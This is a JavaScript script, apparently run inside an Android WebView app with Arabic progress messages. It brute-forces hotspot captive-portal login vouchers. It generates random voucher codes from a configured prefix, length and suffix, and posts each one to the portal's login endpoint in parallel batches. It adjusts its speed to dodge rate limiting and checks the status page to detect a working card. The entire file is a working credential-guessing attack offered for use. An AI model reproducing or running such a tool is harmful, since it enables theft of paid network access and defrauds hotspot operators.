(function() {
    const CFG = window.FINDER_CONFIG;
    let stopped = false;
    let rtt = 500;
    let parallel = 1;

    function log(m) { if (window.AndroidBridge) window.AndroidBridge.log(m); }
    function progress(c, t, v) { if (window.AndroidBridge) window.AndroidBridge.progress(c, t, v); }
    function reportFound(v, st) { if (window.AndroidBridge) window.AndroidBridge.found(v, JSON.stringify(st)); }
    window.stopFinder = function() { stopped = true; };

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    async function safeJson(url) {
        try {
            const r = await fetch(url, { credentials: 'include', cache: 'no-cache' });
            const t = await r.text();
            try { return JSON.parse(t); } catch(e) {
                const s = t.indexOf('{'), e2 = t.lastIndexOf('}');
                if (s !== -1 && e2 > s) { try { return JSON.parse(t.substring(s, e2+1)); } catch(_) {} }
                return null;
            }
        } catch(e) { return null; }
    }

    function isActive(st) {
        if (!st) return false;
        const li = String(st.logged_in || '').toLowerCase();
        if (!['yes','true','1','on'].includes(li)) return false;
        const u = String(st.username || '').trim();
        const ip = String(st.ip || '').trim();
        const up = String(st.uptime || '').trim();
        return (u && u !== '-' && u !== 'N/A') || (ip && ip !== '-' && up && up !== '-');
    }

    function statusUser(st) {
        if (!st) return null;
        const u = String(st.username || '').trim();
        return (u && u !== '-' && u !== 'N/A' && u !== '---') ? u : null;
    }

    function uptimeSec(s) {
        if (!s) return -1;
        const m = String(s).trim().match(/^(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/);
        if (!m) return -1;
        return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
    }

    async function measureRTT(url, n) {
        const times = [];
        for (let i = 0; i < n; i++) {
            const t0 = performance.now();
            try {
                await fetch(url, { credentials: 'include', cache: 'no-cache' });
                times.push(performance.now() - t0);
            } catch(e) {}
            await sleep(50);
        }
        if (times.length === 0) return 500;
        return times.reduce((a,b) => a+b, 0) / times.length;
    }

    function calcParallel(r) {
        if (r < 60) return 10;
        if (r < 120) return 8;
        if (r < 200) return 6;
        if (r < 350) return 4;
        if (r < 600) return 3;
        if (r < 1000) return 2;
        return 1;
    }

    async function run() {
        const base = new URL(CFG.url).origin;
        const statusUrl = base + '/status?var=callBack';
        const loginUrl = base + '/login';

        log('▶ بدء: ' + base);
        log('⚡ قياس سرعة الشبكة...');
        rtt = await measureRTT(statusUrl, 3);
        parallel = Math.min(5, calcParallel(rtt));
        log('⚡ RTT=' + Math.round(rtt) + 'ms → توازي=' + parallel + ' (~' + Math.round(parallel * 1000 / rtt) + ' محاولة/ث)');

        const init = await safeJson(statusUrl);
        if (init && isActive(init)) {
            const u = statusUser(init);
            if (u) { log('✓ كرت مسجل: ' + u); reportFound(u, init); return; }
            log('⚠ جلسة نشطة، username مخفي'); return;
        }

        let template = { username: '', password: '', dst: base + '/', popup: 'true' };
        try {
            const html = await fetch(CFG.url, { credentials: 'include' }).then(r => r.text());
            const doc = new DOMParser().parseFromString(html, 'text/html');
            const form = doc.querySelector('form');
            if (form) form.querySelectorAll('input').forEach(i => {
                const n = i.getAttribute('name');
                if (n) template[n] = i.getAttribute('value') || '';
            });
        } catch(e) {}

        const maxVal = Math.pow(10, CFG.digits) - 1;
        const tried = new Set();
        const beforeUp = init ? uptimeSec(init.uptime) : -1;
        const beforeActive = isActive(init);
        const startTime = performance.now();

        function gen() {
            for (let k = 0; k < 200; k++) {
                const num = Math.floor(Math.random() * (maxVal + 1));
                const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
                if (!tried.has(v)) { tried.add(v); return v; }
            }
            return null;
        }

        async function post(v) {
            const body = new URLSearchParams();
            for (const k in template) body.set(k, template[k]);
            body.set('username', v);
            body.set('password', '');
            const t0 = performance.now();
            try {
                const r = await fetch(loginUrl, {
                    method: 'POST', body: body.toString(),
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    redirect: 'manual'
                });
                const loc = r.headers.get('Location') || '';
                const fail = /error|fail|invalid/i.test(loc);
                return { v, code: r.status, loc, fastFail: fail, t: performance.now() - t0 };
            } catch(e) {
                return { v, code: 0, err: true, fastFail: true, t: performance.now() - t0 };
            }
        }

        let done = 0;
        let batchCount = 0;
        let rateLimitHits = 0;

        while (done < CFG.attempts && !stopped) {
            const batch = [];
            for (let j = 0; j < parallel && done < CFG.attempts; j++) {
                const v = gen();
                if (!v) break;
                done++;
                progress(done, CFG.attempts, v + ' ⚡' + parallel);
                batch.push(post(v));
            }
            if (batch.length === 0) break;

            const bStart = performance.now();
            const results = await Promise.all(batch);
            const bTime = performance.now() - bStart;
            batchCount++;

            const limited = results.some(r => r.code === 429 || r.code === 503);
            if (limited) {
                rateLimitHits++;
                if (rateLimitHits >= 2) {
                    parallel = Math.max(1, Math.floor(parallel / 2));
                    log('🛑 حظر — خفض التوازي إلى ' + parallel);
                    rateLimitHits = 0;
                }
                await sleep(1500);
            } else {
                rateLimitHits = Math.max(0, rateLimitHits - 1);
            }

            const perReq = bTime / Math.max(1, batch.length);
            rtt = rtt * 0.7 + perReq * 0.3;
            if (batchCount % 8 === 0) {
                const newPar = Math.min(10, calcParallel(rtt));
                if (newPar !== parallel) {
                    parallel = newPar;
                    log('⚙ ضبط: RTT=' + Math.round(rtt) + 'ms → توازي=' + parallel);
                }
            }

            const needCheck = results.some(r => !r.fastFail && r.code !== 429 && r.code !== 503 && r.code !== 0);
            if (needCheck) {
                await sleep(30);
                const st = await safeJson(statusUrl);
                const u = statusUser(st);
                if (u) { log('✅ ' + u); reportFound(u, st); return; }
                const up = uptimeSec(st && st.uptime);
                if (st && isActive(st) && beforeUp > 30 && up >= 0 && up <= 15) {
                    log('✅ uptime reset'); reportFound(results[0].v, st); return;
                }
                if (st && isActive(st) && !beforeActive && up >= 0 && up <= 15) {
                    log('✅ جلسة جديدة'); reportFound(results[0].v, st); return;
                }
            }

            if (done % 30 === 0) {
                const st = await safeJson(statusUrl);
                const u = statusUser(st);
                if (u && !tried.has(u)) { log('✅ periodic: ' + u); reportFound(u, st); return; }
            }
        }

        const sec = ((performance.now() - startTime) / 1000).toFixed(1);
        log('❌ لم يُعثر — ' + tried.size + ' محاولة في ' + sec + 's (' + Math.round(tried.size / sec) + '/ث)');
    }

    setTimeout(run, 500);
})();
